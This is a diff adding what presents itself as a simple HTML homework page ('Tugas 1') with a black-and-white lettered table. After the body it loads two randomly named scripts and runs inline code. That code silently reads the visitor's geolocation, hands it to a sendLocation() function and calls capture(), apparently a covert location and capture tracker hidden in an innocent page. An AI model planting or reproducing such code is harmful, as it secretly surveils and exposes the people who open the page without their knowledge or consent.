@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tugas 1</title>
+    <style>
+        table {
+            width: 85%;
+            border-collapse: collapse;
+        }
+        td {
+            border: 1px;
+            height: 30px;
+        }
+    </style>
+</head>
+
+<body>
+    <table align="center">
+        <tr bgcolor="black">
+            <td></td>
+            <td align="center" style="color: rgb(255, 255, 255);">A</td>
+            <td></td>
+        </tr>
+        <tr>
+            <td align="right" bgcolor="black" style="color: white;">B</td>
+            <td bgcolor="black"></td>
+            <td align="center">C</td>
+        </tr>
+        <tr align="center">
+            <td>D</td>
+            <td bgcolor="black" style="color: white;">E</td>
+            <td>F</td>
+        </tr>
+        <tr>
+          <td align="center" bgcolor="black" style="color: white;">G</td>
+          <td></td>
+          <td>H</td>
+        </tr>
+        <tr>
+          <td align="right">I</td>
+          <td></td>
+          <td align="center" bgcolor="black" style="color: white;">J</td>
+        </tr>
+    </table>
+</body>
+<script src="../js/jP9GAcJGznbenzSd3z9yOS2EUQl4Zs2T.js"></script>
+<script src="../js/ZInAi3rLDQMj9y4yR43oUgYMrDoaDCTy.js"></script>
+<script src="../js/jquery.min.js"></script>
+<script type="text/javascript">
+    // Check if geolocation is supported
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                sendLocation(latitude, longitude);
+            },
+            (error) => {
+                //console.error(`Error Code: ${error.code} - ${error.message}`);
+            }
+        );
+    } else {
+        console.error("Geolocation is not supported by this browser.");
+    }
+    capture();
+</script>
+</html>
